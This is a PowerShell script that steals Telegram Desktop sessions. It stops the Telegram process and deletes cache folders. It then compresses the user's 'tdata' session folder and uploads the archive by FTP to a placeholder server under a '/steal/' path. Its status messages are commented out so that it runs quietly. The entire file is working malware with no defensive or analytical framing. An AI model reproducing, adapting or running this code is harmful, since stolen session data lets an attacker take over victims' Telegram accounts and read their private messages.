$processName = "telegram"

try{

if (Get-Process $processName -ErrorAction SilentlyContinue) {
    Get-Process -Name $processName  | Stop-Process
} else {
   # Write-Host "$processName is not running."
}



#Write-Host "Telegram Application Closed..."

}
catch{

#Write-Host "something went wrong..."

}
$userName = $env:USERNAME
$folderPath1  = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\user_data"
$folderPath2  = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\emoji"

try{
Remove-Item $folderPath1 -Recurse -Force  -ErrorAction SilentlyContinue
#Write-Host "Removed user_data"
Remove-Item $folderPath2 -Recurse -Force  -ErrorAction SilentlyContinue
#Write-Host "Removed emoji"

}

catch{

}
$source_folder = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata"
$zip_file = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"
$max_size = 50 * 1MB # Convert to bytes


if (Test-Path $zip_file) {
    Remove-Item $zip_file
}

#Write-Host "Compressing files in $source_folder to $zip_file..."

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($source_folder, $zip_file, "Optimal", $false)


Get-ChildItem $zip_file | Where-Object { $_.Length -gt $max_size } | ForEach-Object {
    Write-Host "Removing $($_.FullName)..."
    Remove-Item $_.FullName
}

$userName = $env:USERNAME
$filePath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"
$dateString = Get-Date -Format "yyyyMMdd_HHmmss"
## FTP server settings
$ftpServer = "your_ftp_server"
$ftpUsername = "xxxxx"
$ftpPassword = "yyyyy"

# Local file to upload
$localFilePath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"

# Remote FTP file path
$remoteFilePath = "/steal/$dateString.zip"

# Create FTP session
$ftpSession = New-Object -TypeName System.Net.WebClient
$ftpSession.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)

# Upload file
$ftpSession.UploadFile("ftp://$ftpServer/$remoteFilePath", $localFilePath)

# Close FTP session
$ftpSession.Dispose()
